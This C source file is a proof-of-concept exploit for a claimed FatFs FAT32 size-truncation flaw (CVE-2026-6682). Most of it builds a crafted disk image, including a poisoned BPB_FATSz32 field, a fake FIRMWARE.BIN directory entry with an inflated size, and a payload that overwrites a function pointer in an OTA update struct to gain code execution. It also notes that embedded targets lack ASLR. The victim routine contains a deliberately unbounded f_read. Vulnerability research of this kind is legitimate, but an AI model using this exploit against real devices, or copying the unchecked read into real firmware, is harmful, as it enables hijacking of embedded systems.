/*===========================================================================
 * rce_demo.c — CVE-2026-6682 RCE: struct function-pointer overwrite via f_read()
 *
 * PURPOSE
 * -------
 * The existing test_bug1_rce_exploit() in test_harness.c is unconvincing:
 * it reads a raw pointer-sized value from the crafted file and then
 * EXPLICITLY casts and calls that value.  The caller clearly knows it is
 * treating file bytes as a code pointer, which dilutes the argument.
 *
 * This standalone demo shows the CVE-2026-6682 chain in a REALISTIC application
 * scenario modelled on embedded OTA firmware-update code:
 *
 *   1. A struct is declared with a fixed-size header buffer followed
 *      immediately by a function-pointer callback field.
 *
 *   2. The application reads the "firmware file" using finfo.fsize as the
 *      byte count — a common oversight when the developer assumes the
 *      filesystem will never report a size larger than the buffer.
 *
 *   3. CVE-2026-6682 makes finfo.fsize attacker-controlled (it comes from the
 *      fake directory entry planted in the FAT area at sector 6).
 *
 *   4. f_read() writes finfo.fsize bytes starting at ctx.fw_header,
 *      silently overflowing into ctx.on_apply, overwriting the function
 *      pointer with an attacker-supplied value.
 *
 *   5. The application calls ctx.on_apply() — which now executes the
 *      attacker's target.  rce_canary is set to confirm execution.
 *
 * The attacker never touches a "function pointer variable" directly;
 * the corruption happens inside an opaque byte copy inside FatFs.
 *
 * Note on ASLR
 * ------------
 * In the real embedded target (SD-card attack on STM32/RP2040/ESP32 etc.)
 * there is NO address-space randomisation.  The firmware image is linked
 * at a fixed base address printed in the datasheet; the attacker extracts
 * the target address from the publicly available binary.
 *
 * In this host-OS demo we obtain rce_win's address at runtime so the test
 * is self-contained and portable.  The result is identical: once the disk
 * image is built with the correct address, mounting it and running the
 * "updater" causes rce_win() to execute.
 *
 * Build (without sanitisers, without stack protector — lets the overflow
 * reach the function pointer field without being caught mid-flight):
 *
 *   make rce_demo          (see Makefile target at bottom of this file)
 *
 * Expected output:
 *   [ATTACKER] ...
 *   [VICTIM]   ...
 *   [OTA] Invoking post-update callback at 0x<rce_win>
 *   [RESULT]   rce_canary = 0xDEAD  — EXPLOITED
 *===========================================================================*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stddef.h>
#include <assert.h>
#include <inttypes.h>

#include "ff.h"
#include "diskio.h"
#include "diskio_ramdisk.h"

/* ── little-endian write helpers ─────────────────────────────────────────── */
static inline void st16le(uint8_t *p, uint16_t v)
    { p[0]=(uint8_t)v; p[1]=(uint8_t)(v>>8); }
static inline void st32le(uint8_t *p, uint32_t v)
    { p[0]=(uint8_t)v; p[1]=(uint8_t)(v>>8);
      p[2]=(uint8_t)(v>>16); p[3]=(uint8_t)(v>>24); }
static inline void st64le(uint8_t *p, uint64_t v)
    { for(int i=0;i<8;i++){ p[i]=(uint8_t)v; v>>=8; } }

/*===========================================================================
 * The vulnerable OTA context struct
 *
 * This models the pattern used by many embedded OTA or config-file readers:
 *   • a fixed-size header/payload buffer that gets filled by f_read()
 *   • metadata fields (crc32, version) immediately after
 *   • an application-supplied callback right at the end
 *
 * The developer's intent:
 *   "I read finfo.fsize bytes into fw_header; finfo.fsize will never
 *    exceed FW_HDR_SIZE because the SD card is ours."
 *
 * The attacker's insight:
 *   CVE-2026-6682 makes finfo.fsize equal to sizeof(ota_ctx_t), so f_read()
 *   writes past fw_header into crc32, version, and finally on_apply.
 *===========================================================================*/

#define FW_HDR_SIZE  128u          /* bytes the developer reserved for data */

typedef struct ota_ctx {
    uint8_t   fw_header[FW_HDR_SIZE];  /* offset   0, length 128            */
    uint32_t  crc32;                   /* offset 128, length   4            */
    uint32_t  version;                 /* offset 132, length   4            */
    void    (*on_apply)(void);         /* offset 136, length   8 (64-bit)   */
} ota_ctx_t;                           /* sizeof = 144 on LP64              */

/* Compile-time layout assertions — fail fast on exotic ABIs. */
_Static_assert(offsetof(ota_ctx_t, fw_header) == 0,
               "fw_header must start at offset 0");
_Static_assert(offsetof(ota_ctx_t, crc32)     == FW_HDR_SIZE,
               "crc32 must follow fw_header without gap");
_Static_assert(offsetof(ota_ctx_t, version)   == FW_HDR_SIZE + 4,
               "version must follow crc32");
_Static_assert(offsetof(ota_ctx_t, on_apply)  == FW_HDR_SIZE + 8,
               "on_apply must follow version (no padding on LP64)");
_Static_assert(sizeof(ota_ctx_t) == FW_HDR_SIZE + 16,
               "sizeof(ota_ctx_t) must be FW_HDR_SIZE+16 on LP64");

/*===========================================================================
 * Stub functions
 *===========================================================================*/

/* The legitimate post-update callback set by the application. */
__attribute__((noinline))
static void safe_update_complete(void)
{
    puts("    [on_apply] safe_update_complete() — normal path");
}

/* The attacker's target: flip a global canary to confirm execution reached
 * here via the overwritten function pointer, not via safe_update_complete(). */
static volatile int rce_canary = 0;

__attribute__((noinline))
static void rce_win(void)
{
    rce_canary = 0xDEAD;
    puts("    *** rce_win() called — attacker-controlled code is executing ***");
}

/*===========================================================================
 * VICTIM: vulnerable_ota_check()
 *
 * This function is the VICTIM.  It contains no deliberately insecure code
 * except for one extremely common mistake:
 *
 *   f_read(&fp, ctx.fw_header, finfo.fsize, &br)
 *              ^^^^^^^^^^^^^^  ^^^^^^^^^^^^
 *              destination     size = ATTACKER-CONTROLLED
 *
 * The developer assumed finfo.fsize <= FW_HDR_SIZE.  On a trusted disk
 * that assumption holds; on a crafted CVE-2026-6682 disk it does not.
 *
 * Everything else here — the struct, the callback, the stat/open/read
 * pattern — is normal embedded application code.
 *===========================================================================*/
static void vulnerable_ota_check(void)
{
    ota_ctx_t ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.on_apply = safe_update_complete;   /* application sets a sane default */

    printf("  [OTA] ctx at %p\n", (void *)&ctx);
    printf("  [OTA] ctx.fw_header  at %p  (len %u)\n",
           (void *)ctx.fw_header, FW_HDR_SIZE);
    printf("  [OTA] ctx.on_apply   at %p  = %p  (safe_update_complete)\n",
           (void *)&ctx.on_apply, (void *)(uintptr_t)ctx.on_apply);

    /* ── check for update file ───────────────────────────────────────── */
    FILINFO finfo;
    if (f_stat("0:/FIRMWARE.BIN", &finfo) != FR_OK) {
        puts("  [OTA] No FIRMWARE.BIN found — nothing to do.");
        return;
    }
    printf("  [OTA] Found FIRMWARE.BIN — finfo.fsize = %u bytes\n",
           (unsigned)finfo.fsize);

    /* ── open and read ───────────────────────────────────────────────── */
    FIL fp;
    UINT br = 0;
    if (f_open(&fp, "0:/FIRMWARE.BIN", FA_READ) != FR_OK) {
        puts("  [OTA] f_open failed.");
        return;
    }

    /*
     * THE VULNERABLE LINE
     * ───────────────────
     * The developer writes into ctx.fw_header but uses finfo.fsize — not
     * sizeof(ctx.fw_header) — as the count argument.
     *
     * On a trusted disk: finfo.fsize == actual payload size <= FW_HDR_SIZE.
     * On a CVE-2026-6682 disk:   finfo.fsize == sizeof(ota_ctx_t) == 144.
     *
     * f_read() writes 144 bytes starting at ctx.fw_header, which is the
     * base of the entire struct.  The last 8 bytes overwrite ctx.on_apply.
     */
    FRESULT rr = f_read(&fp, ctx.fw_header, finfo.fsize, &br);
    f_close(&fp);

    printf("  [OTA] f_read: res=%d br=%u\n", (int)rr, br);
    printf("  [OTA] ctx.crc32   = 0x%08X\n", ctx.crc32);
    printf("  [OTA] ctx.version = 0x%08X\n", ctx.version);
    printf("  [OTA] ctx.on_apply NOW = %p  (was safe_update_complete = %p)\n",
           (void *)(uintptr_t)ctx.on_apply,
           (void *)(uintptr_t)safe_update_complete);

    /* ── invoke the callback ─────────────────────────────────────────── */
    puts("  [OTA] Invoking ctx.on_apply()...");
    ctx.on_apply();   /* ← on a crafted disk this calls rce_win() */
}

/*===========================================================================
 * ATTACKER: disk image builder
 *
 * Uses the identical CVE-2026-6682 overflow geometry as test_harness.c:
 *   BPB_FATSz32 = 0x80000001, NumFATs = 2
 *   → fasize (DWORD) = 0x100000002 truncated to 0x00000002
 *   → sysect = 4(reserved) + 2(truncated) + 0(root) = 6
 *   → database = sector 6   (inside FAT area [4, ∞))
 *   → clst2sect(2) = 6  (root dir reads from sector 6)
 *   → clst2sect(4) = 8  (FIRMWARE.BIN data reads from sector 8)
 *
 * Sector 6 — fake root directory entry for FIRMWARE.BIN:
 *   FileSize = sizeof(ota_ctx_t) = 144  ← key: > FW_HDR_SIZE
 *   FstClus  = 4
 *
 * Sector 8 — payload (144 bytes):
 *   [  0.. 127] 0x42 'B' fill    → lands in ctx.fw_header (no effect)
 *   [128..131]  fake crc32       → lands in ctx.crc32     (no effect)
 *   [132..135]  fake version     → lands in ctx.version   (no effect)
 *   [136..143]  target fptr LE   → lands in ctx.on_apply  (CONTROL!)
 *===========================================================================*/
static void build_exploit_image(uint8_t *disk, size_t disk_bytes,
                                uintptr_t target)
{
    memset(disk, 0, disk_bytes);

    /* ── VBR / BPB (sector 0) ────────────────────────────────────────── */
    uint8_t *vbr = disk;

    vbr[0]=0xEB; vbr[1]=0x58; vbr[2]=0x90;
    memcpy(&vbr[3], "MSDOS5.0", 8);

    st16le(&vbr[11], 512);           /* BPB_BytsPerSec  = 512              */
    vbr[13] = 1;                      /* BPB_SecPerClus  = 1                */
    st16le(&vbr[14], 4);             /* BPB_RsvdSecCnt  = 4                */
    vbr[16] = 2;                      /* BPB_NumFATs     = 2                */
    st16le(&vbr[17], 0);             /* BPB_RootEntCnt  = 0  (FAT32)       */
    st16le(&vbr[19], 0);             /* BPB_TotSec16    = 0                */
    vbr[21] = 0xF8;                   /* BPB_Media                         */
    st16le(&vbr[22], 0);             /* BPB_FATSz16     = 0  (use 32-bit)  */
    st16le(&vbr[24], 63);            /* BPB_SecPerTrk                      */
    st16le(&vbr[26], 255);           /* BPB_NumHeads                       */
    st32le(&vbr[28], 0);             /* BPB_HiddSec                        */
    st32le(&vbr[32], 65536);         /* BPB_TotSec32                       */

    /*
     * CRAFTED FIELD: BPB_FATSz32 = 0x80000001
     * fasize (DWORD) = 0x80000001 * 2 = 0x100000002 → truncates to 2
     * sysect = 4 + 2 + 0 = 6 → database = sector 6 (inside FAT!)
     */
    st32le(&vbr[36], 0x80000001U);   /* BPB_FATSz32  (CRAFTED)            */

    st16le(&vbr[40], 0);             /* BPB_ExtFlags32  = 0               */
    st16le(&vbr[42], 0);             /* BPB_FSVer32     = 0.0             */
    st32le(&vbr[44], 2);             /* BPB_RootClus32  = cluster 2       */
    st16le(&vbr[48], 0);             /* BPB_FSInfo32    = 0 (disabled)    */
    st16le(&vbr[50], 0);             /* BPB_BkBootSec32 = 0               */
    vbr[64] = 0x80;                   /* BS_DrvNum32                       */
    vbr[66] = 0x29;                   /* BS_BootSig32                      */
    st32le(&vbr[67], 0xDEADBEEFU);  /* BS_VolID32                        */
    memcpy(&vbr[71], "EXPLOIT    ", 11); /* BS_VolLab32                   */
    memcpy(&vbr[82], "FAT32   ", 8);    /* BS_FilSysType32                */
    st16le(&vbr[510], 0xAA55);

    /* ── FAT1 (sector 4) ─────────────────────────────────────────────── */
    uint8_t *fat1 = disk + 4 * 512;
    st32le(&fat1[0],  0x0FFFFFF8U);  /* cluster 0: media descriptor       */
    st32le(&fat1[4],  0x0FFFFFFFU);  /* cluster 1: reserved EOC           */
    st32le(&fat1[8],  0x0FFFFFFFU);  /* cluster 2: root dir EOC           */
    /* cluster 3: free (0) */
    st32le(&fat1[16], 0x0FFFFFFFU);  /* cluster 4: FIRMWARE.BIN EOC       */

    /* ── FAT2 (sector 5, mirror) ─────────────────────────────────────── */
    memcpy(disk + 5 * 512, fat1, 20);

    /* ── Fake root directory at sector 6 ────────────────────────────── *
     * After the CVE-2026-6682 overflow: clst2sect(2) = database(6) + 0 = 6.    *
     * FatFs reads sector 6 as the root directory of the FAT32 volume.  *
     *                                                                    *
     * 8.3 SFN entry for "FIRMWARE.BIN"                                  *
     *   DIR_FstClusHI = 0, DIR_FstClusLO = 4 → first cluster = 4       *
     *   DIR_FileSize  = sizeof(ota_ctx_t) = 144                         *
     *                                                                    *
     * sizeof(ota_ctx_t) > FW_HDR_SIZE triggers the overflow when the    *
     * victim calls f_read(fp, ctx.fw_header, finfo.fsize, &br).         */
    uint8_t *dir6 = disk + 6 * 512;
    memset(dir6, 0, 512);
    memcpy(dir6 + 0,  "FIRMWARE", 8);  /* DIR_Name[0..7]   */
    memcpy(dir6 + 8,  "BIN",      3);  /* DIR_Name[8..10]  */
    dir6[11] = 0x20;                    /* DIR_Attr = AM_ARC */
    st16le(dir6 + 20, 0);             /* DIR_FstClusHI = 0 */
    st16le(dir6 + 26, 4);             /* DIR_FstClusLO = 4 */
    st32le(dir6 + 28, (uint32_t)sizeof(ota_ctx_t)); /* DIR_FileSize */
    /* offset 32: end-of-directory marker (0x00) */

    /* ── Payload at sector 8 ─────────────────────────────────────────── *
     * clst2sect(4) = database(6) + SecPerClus(1) * (4-2) = 8.          *
     *                                                                    *
     * Layout matches ota_ctx_t exactly:                                  *
     *   [  0..127]  fake firmware header — lands in ctx.fw_header       *
     *   [128..131]  fake CRC32          — lands in ctx.crc32            *
     *   [132..135]  fake version        — lands in ctx.version          *
     *   [136..143]  target fptr (LE)    — lands in ctx.on_apply  ← RCE */
    uint8_t *sect8 = disk + 8 * 512;
    memset(sect8, 0, 512);

    /* Fake firmware header: plausible-looking magic + padding */
    memcpy(sect8, "FWUPDATE", 8);
    memset(sect8 + 8, 0x42, FW_HDR_SIZE - 8);

    /* Fake CRC32 and version — convincing metadata */
    st32le(sect8 + FW_HDR_SIZE,     0xDEADBEEFU);  /* crc32   */
    st32le(sect8 + FW_HDR_SIZE + 4, 0x00010000U);  /* version 1.0 */

    /* Function pointer payload at offset FW_HDR_SIZE + 8 = 136          *
     * This lands exactly on ctx.on_apply in the victim's stack frame.   */
    st64le(sect8 + FW_HDR_SIZE + 8, (uint64_t)target);

    printf("  [ATTACKER] Payload written to sector 8:\n");
    printf("             fw_header  [0..%u)   = 'FWUPDATE' + 0x42 fill\n",
           FW_HDR_SIZE);
    printf("             crc32      [%u..%u)  = 0xDEADBEEF\n",
           FW_HDR_SIZE, FW_HDR_SIZE + 4);
    printf("             version    [%u..%u)  = 0x00010000\n",
           FW_HDR_SIZE + 4, FW_HDR_SIZE + 8);
    printf("             on_apply   [%u..%u)  = %p  (rce_win)\n",
           (unsigned)(FW_HDR_SIZE + 8), (unsigned)(FW_HDR_SIZE + 16),
           (void *)target);
    printf("  [ATTACKER] DIR_FileSize in fake entry = %u\n",
           (unsigned)sizeof(ota_ctx_t));
    printf("  [ATTACKER] Overflow: %u bytes written, "
           "only %u fit in fw_header → %zu bytes past end\n",
           (unsigned)sizeof(ota_ctx_t), FW_HDR_SIZE,
           sizeof(ota_ctx_t) - FW_HDR_SIZE);
}

/* Write the disk image to a file (so it can be inspected or replayed). */
static int save_image(const char *path, const uint8_t *disk, size_t sz)
{
    FILE *f = fopen(path, "wb");
    if (!f) { perror(path); return -1; }
    size_t written = fwrite(disk, 1, sz, f);
    fclose(f);
    if (written != sz) {
        fprintf(stderr, "save_image: short write %zu / %zu\n", written, sz);
        return -1;
    }
    printf("  [ATTACKER] Disk image saved to '%s' (%zu bytes)\n", path, sz);
    return 0;
}

/* Load the disk image from a file into the RAM disk layer. */
static int load_image(const char *path)
{
    FILE *f = fopen(path, "rb");
    if (!f) { perror(path); return -1; }
    static uint8_t buf[RAMDISK_SIZE_BYTES];
    size_t n = fread(buf, 1, sizeof(buf), f);
    fclose(f);
    if (n == 0) { fprintf(stderr, "load_image: empty file\n"); return -1; }
    ramdisk_load(buf, (UINT)n);
    printf("  [VICTIM]   Loaded disk image '%s' (%zu bytes) into RAM disk\n",
           path, n);
    return 0;
}

/*===========================================================================
 * main
 *===========================================================================*/
int main(void)
{
    printf("==========================================================\n");
    printf(" CVE-2026-6682 RCE DEMO: FAT32 overflow → struct pointer overwrite\n");
    printf("==========================================================\n\n");

    /* ── Layout sanity ───────────────────────────────────────────────── */
    printf("ota_ctx_t layout:\n");
    printf("  offsetof(fw_header) = %zu\n", offsetof(ota_ctx_t, fw_header));
    printf("  offsetof(crc32)     = %zu\n", offsetof(ota_ctx_t, crc32));
    printf("  offsetof(version)   = %zu\n", offsetof(ota_ctx_t, version));
    printf("  offsetof(on_apply)  = %zu\n", offsetof(ota_ctx_t, on_apply));
    printf("  sizeof(ota_ctx_t)   = %zu\n", sizeof(ota_ctx_t));
    printf("  FW_HDR_SIZE         = %u\n\n", FW_HDR_SIZE);

    assert(sizeof(void *) == 8 &&
           "Demo assumes LP64 — adjust FW_HDR_SIZE or struct if needed");

    /* ── ATTACKER PHASE ──────────────────────────────────────────────── */
    printf("--- ATTACKER builds exploit disk image ---\n");

    uintptr_t target = (uintptr_t)(void (*)(void))rce_win;
    printf("  [ATTACKER] safe_update_complete = %p  (legitimate callback)\n",
           (void *)(uintptr_t)safe_update_complete);
    printf("  [ATTACKER] rce_win              = %p  (attack target)\n",
           (void *)target);
    printf("  [ATTACKER] On a real embedded MCU these addresses are fixed\n");
    printf("             (no ASLR); attacker reads them from the firmware blob.\n\n");

    static uint8_t disk[RAMDISK_SIZE_BYTES];
    build_exploit_image(disk, sizeof(disk), target);

    const char *img_path = "exploit_bug1.img";
    if (save_image(img_path, disk, sizeof(disk)) != 0) return 1;
    printf("\n");

    /* ── VICTIM PHASE ──────────────────────────────────────────────────── */
    printf("--- VICTIM mounts the SD card (exploit_bug1.img) ---\n");

    if (load_image(img_path) != 0) return 1;

    FATFS fs;
    memset(&fs, 0, sizeof(fs));
    FRESULT mres = f_mount(&fs, "0:", 1);
    printf("  [VICTIM]   f_mount() = %d  (FR_OK=0)\n", (int)mres);
    if (mres != FR_OK) {
        printf("  [VICTIM]   Mount failed — CVE-2026-6682 overflow may be blocked.\n");
        return 1;
    }
    printf("  [VICTIM]   fs.fatbase  = %u  (FAT starts here)\n",
           (unsigned)fs.fatbase);
    printf("  [VICTIM]   fs.database = %u  (data area — should be >> FAT)\n",
           (unsigned)fs.database);
    printf("  [VICTIM]   *** database=%u is INSIDE FAT region [%u, ~∞) ***\n\n",
           (unsigned)fs.database, (unsigned)fs.fatbase);

    printf("--- VICTIM runs the OTA update checker ---\n");
    rce_canary = 0;
    vulnerable_ota_check();
    printf("\n");

    /* ── RESULT ──────────────────────────────────────────────────────── */
    printf("==========================================================\n");
    printf(" RESULT\n");
    printf("==========================================================\n");
    printf("  rce_canary = 0x%X  (0xDEAD = rce_win executed)\n", rce_canary);

    if (rce_canary == 0xDEAD) {
        printf("\n  CONFIRMED: rce_win() executed via ctx.on_apply overwrite.\n");
        printf("\n  How the chain worked:\n");
        printf("    1. CVE-2026-6682 overflow → fs.database = sector 6\n");
        printf("    2. Sector 6 contains attacker's fake directory entry\n");
        printf("    3. f_stat(\"FIRMWARE.BIN\") returns finfo.fsize = %zu\n",
               sizeof(ota_ctx_t));
        printf("    4. f_read(fp, ctx.fw_header, %zu, &br) writes %zu bytes\n",
               sizeof(ota_ctx_t), sizeof(ota_ctx_t));
        printf("       → %zu bytes overflow past fw_header[%u]\n",
               sizeof(ota_ctx_t) - FW_HDR_SIZE, FW_HDR_SIZE);
        printf("       → ctx.on_apply overwritten with rce_win addr\n");
        printf("    5. ctx.on_apply() → rce_win() → canary = 0xDEAD\n");
        printf("\n  The victim code contains NO explicit function-pointer\n");
        printf("  cast of file data; the corruption is entirely implicit.\n");
    } else {
        printf("\n  NOT EXPLOITED (CVE-2026-6682 patched or struct layout differs).\n");
    }

    f_mount(NULL, "0:", 0);
    return (rce_canary == 0xDEAD) ? 0 : 1;
}
